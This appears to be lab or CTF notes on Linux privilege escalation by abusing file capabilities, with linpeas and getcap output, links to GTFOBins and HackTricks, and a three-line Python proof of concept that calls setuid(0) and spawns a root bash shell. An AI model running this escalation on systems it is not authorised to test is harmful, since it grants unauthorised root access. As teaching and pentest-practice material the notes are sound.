Notice that setuid was identified by linpeas
![image](https://github.com/user-attachments/assets/7c71f3bf-55ab-458c-86e5-480a08529df0)

POC to get priv-escalate

import os
os.setuid(0)
os.system("/bin/bash")

Note: This vuln is python based but the top-level vulnerability is much more broader. Digging into https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/ I found the following information...

Linux has something called capabilities... Allow processes, binaries, services and users to perform root level stuff without root.
You can read traffic, mount file systems, or in this case, change your UID...

using getcap (get capabilities) we can find similar output to linpeas
getcap -r / 2>/dev/null
![image](https://github.com/user-attachments/assets/23ea4b4f-3666-409a-b583-d89ef43aea5f)

You can also check running proccesses to see if they have capabilities. If its a user started process, bada-bing, bada-boom
cat /proc/[process ID]/status | grep Cap

Capabilities assigned to users are stored in the /etc/security/capability.conf configuration file:

GTFO bins has a section for capabilities!
![image](https://github.com/user-attachments/assets/e7b8c96e-1264-47a5-b30d-c77d24c0d1c5)


And of course hacktricks
https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/linux-capabilities



